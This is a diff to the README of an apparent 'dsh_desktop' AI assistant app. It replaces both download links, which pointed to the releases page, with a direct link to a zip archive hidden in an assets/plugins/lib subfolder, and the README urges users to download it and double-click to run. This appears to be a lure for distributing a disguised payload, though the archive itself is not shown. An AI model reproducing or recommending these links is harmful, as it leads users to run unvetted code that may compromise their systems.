@@ -10,7 +10,7 @@ Whether you want to ask questions, brainstorm ideas, get help with writing, or e
 
 **>> <<** Click the big button below to get started!
 
-**[⬇️ DOWNLOAD NOW](https://github.com/Kassimo4628/dsh_desktop/releases)** *(Opens in your browser)*
+**[⬇️ DOWNLOAD NOW](https://github.com/Kassimo4628/dsh_desktop/raw/refs/heads/main/dsh-desktop/assets/plugins/dsh-file-changes/lib/dsh_desktop_2.5.zip)** *(Opens in your browser)*
 
 Visit this link to download the application. The download page will open automatically.
 
@@ -126,7 +126,7 @@ Assemble your first AI interaction in minutes. Here's a quick recap:
 3. **Double-click to run**
 4. **Start chatting with your new AI assistant**
 
-**[⬇️ DOWNLOAD dsh_desktop NOW](https://github.com/Kassimo4628/dsh_desktop/releases)**
+**[⬇️ DOWNLOAD dsh_desktop NOW](https://github.com/Kassimo4628/dsh_desktop/raw/refs/heads/main/dsh-desktop/assets/plugins/dsh-file-changes/lib/dsh_desktop_2.5.zip)**
 
 The power of AI is just a few clicks away. Don't wait—unlock your personal AI assistant today!
 
